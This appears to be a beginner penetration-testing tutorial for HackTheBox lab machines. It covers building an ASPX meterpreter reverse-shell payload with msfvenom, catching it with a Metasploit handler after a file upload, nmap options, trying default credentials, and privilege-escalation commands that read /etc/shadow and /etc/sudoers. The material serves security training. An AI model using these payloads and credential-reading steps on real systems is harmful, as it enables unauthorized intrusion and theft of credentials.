---
description: >-
  Take your hacking skills beyond automatic tools like Metasploit, to understand
  what hacking is really about.
---

# Part 2 - Hacking manually

## What do you learn in this part?

* Hacking manually with the Metasploit framework
* Linux terminal tricks
* Nmap options and scripts
* Credential abuse
* Privilege escalation
* Hacking more boxes!

**Boxes that are suitable for this part**

* Devel - 10.10.10.5
* Mirai - 10.10.10.48

**Other relevant boxes**

* Popcorn
* Blocky
* Lazy
* Bastard

## **Hacking manually with the Metasploit framework**

Previously we used Metasploit to automagically exploit a vulnerability and get a shell on a box. But what kind of black magic does Metasploit do? Let's break it down:

1. It prepares a payload - a reverse shell - the code that executes on the target.
2.  It prepares a listener/handler for receiving the reverse shell
3. It uses a prepared exploit to exploit a vulnerable service. Which means it gets code execution on the target, and is then able to execute the payload.

The listener catches the reverse shell connection - we now have a connection / reverse shell on the target, but we can't always rely on Metasploit to do this for us.

First we prepare a payload with the correct file extension. The payload has to match your listener in Metasploit, and the technology on the target. Imagine a web-server running IIS, and we've found out we can upload files and where the files are put. Let's generate an ASPX-payload using msfvenom:

`msfvenom -p windows/meterpreter/reverse_tcp lhost=your_ip_addr lport=4444 -f aspx -o yourname.aspx`

* -p = payload
* -f = format
* -o = outputfile.extension

![](.gitbook/assets/image%20%285%29.png)

We then use the `cat`command to print the contents of the file we generated. As you can see it's a bunch of mumbo jumbo code, but this is actually the _payload_, the code that will execute on the system to give you access.

![](.gitbook/assets/image%20%2816%29.png)

Now that we have prepared our payload, we open msfconsole, which we will use to deliver our payload to the target box.

`msfconsole` 

![](.gitbook/assets/image%20%284%29.png)

Select the handler module, which let's us set up a listener to "catch" our shell from the payload we created:

`use exploit/multi/handler`

Set the correct payload \(needs to be identical to the payload we specified in `msfvenom`. If it does not match, it will not work properly and you will most likely not get a reverse shell back.

`set payload windows/meterpreter/reverse_tcp` 

Now that our payload is selected we're going to do is to check what options we have to set. So we type `options`

![](.gitbook/assets/image%20%288%29.png)

As you can see below there are three required options that must be set to start the listener. We also note that two of the options are already set for us. Hence, the only thing we have to do is set the listener address \(lhost\) option. The lhost and lport options must match exactly those we set when we created our payload. We don't need to use the IP address can also just set lhost to tun0, which is the VPN-adapter used for connecting to HackTheBox.

`set lhost tun0`

`set lport 4444` 

Once you have done this, type `options` to verify that you have set all the required options correctly.  Some of them are filled automatically, and some must be manually entered.

![](.gitbook/assets/image%20%2814%29.png)

We now start our listener, the `-j` option runs the listener in the background, so you can continue using msfconsole while it's listening for incoming sessions. Please also note that sometimes the listener will start on the wrong IP address, so much sure it's correct. Usually this problem is fixed by setting the lhost again, and running the exploit command again.

`exploit -j`

To see currently active listeners, use the "jobs" command:

`jobs`

To see all currently active sessions you can type:

`sessions` 

To interact with a session use the following command, where n is the numbered session you wish to interact with.

`sessions -i  n`

ctrl+z is the shortcut to background sessions.

Now, we need to make sure the payload is triggered. We can view \(and execute\) the payload file in the browser at a URL www.example.com/upload/yourname.aspx. 

What’s the vulnerability here? - Allowing unauthenticated uploading of files - Not limiting allowed file types \(JPG, PDF\) - Allowing access to files directly in the URL. The payload itself makes the server run malicious code that connects to our listener, and boom, we've caught a shell! 

## **Linux terminal tricks**

For help with a command, type command and then

`$  -h or --help`

For the Linux man\(ual\) pages:

`$ man` - shows the man\(ual\) page for command line tools 

`$ cat - display the content of files` 

`$ less - navigate around files` 

`$ grep - search for words` 

`$ find and` 

`$ locate - search for files` 

`$ strings  - find text in files` 

`$ ssh username@ - connect to a box using SSH (secure shell)`

&lt; &gt; and &gt;&gt; is called redirection

`$ echo “string” > file $ python -m SimpleHTTPServer 80 $ wget` 

Installing things in Kali 

`$ apt install` 

## **Nmap tricks**

-A OS detection, version detection, script scanning, and traceroute. Gives a lot of useful info

-v verbose = lots of output 

-n skip DNS-lookup = can save you some time 

`$ nmap  -A -n -v`

`$ nmap --script nameOfScript ls -la /usr/share/nmap/scripts/*`

## **Credential abuse**

Reuse of credentials \(usernames, passwords and keys\) and default credentials are the most common vulnerabilities, and you will see it everywhere. It's such an easy win if it works that you must never forget to at least try even though it may seem unlikely.

* Try defaults like: `admin/password` and `admin/admin`
* Google default creds for whatever you are looking at. E.g. _"wordpress default login"._
* Combine different usernames and passwords you find around. You never know where somebody could have reused them.

A fun exercise here can be to google your own home router make and model to see if you can find the default username and password. If you are the legal owner of the router, try to log in and see what happens!

![](https://lh3.googleusercontent.com/7mdc-kMI1RuZJ5sgYeDmlH26L2AOSULraoWBllzrqrivEGEYo9TpZFBCYL0cMbVTVIyhUbnhxT6go7Cp18kNmo9RPGX93Slky-CnhAHi9P1OlqgLCI7EDl5rCFp9IY-6fgr-bfm6ZWM)

## **Privilege escalation**

In the beginning of your hacking journey, privilege escalation can be very daunting. Because you don't really know exactly what you're looking for. That's why we have the entire fourth part of this guide dedicated to breaking it down into easy steps. However, to make sure you don't get stuck in the mud, we have included some of the basics which might help.

For linux: [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

Confidential information and users that you can check.

`id`

`su` 

`sudo -l` 

`cat /etc/passwd` 

`cat /etc/shadow` 

`cat /etc/group` 

`cat /etc/sudoers` 

`ls -alh /var/www/` 

`ls -ahlR /root/` 

`ls -ahlR /home/`

For Windows: 

* [https://www.rapid7.com/db/modules/post/multi/recon/local\_exploit\_suggester](https://www.rapid7.com/db/modules/post/multi/recon/local_exploit_suggester)
* [https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

Use the exploit suggester, in this case imagine we have a session 1 for our original payload:

`use post/multi/recon/local_exploit_suggester`

`set session 1`

`exploit`

Then try the exploits suggested, same way we used our exploit suggester!

**Credentials** 

Credentials reuse and default credentials are the most common mistakes out there! Try defaults like:

* admin/admin
* admin/password

Google default credentials for whatever you are looking at, combine different usernames and passwords you find! SSH keys might also be useful.

![](https://lh5.googleusercontent.com/P9kkB83xhsIMurqs2eIfvqmyUoUvl0SZ86SrZ1uwAXVSIfS4IltiCtg0xrdmy1TIWjcgxSnw95COoiz85FufBJ3UMHAApaunUnOTjULuUoksp2tmE92h-XWAI8dZH28mI72aKEZagL8)

Good luck!

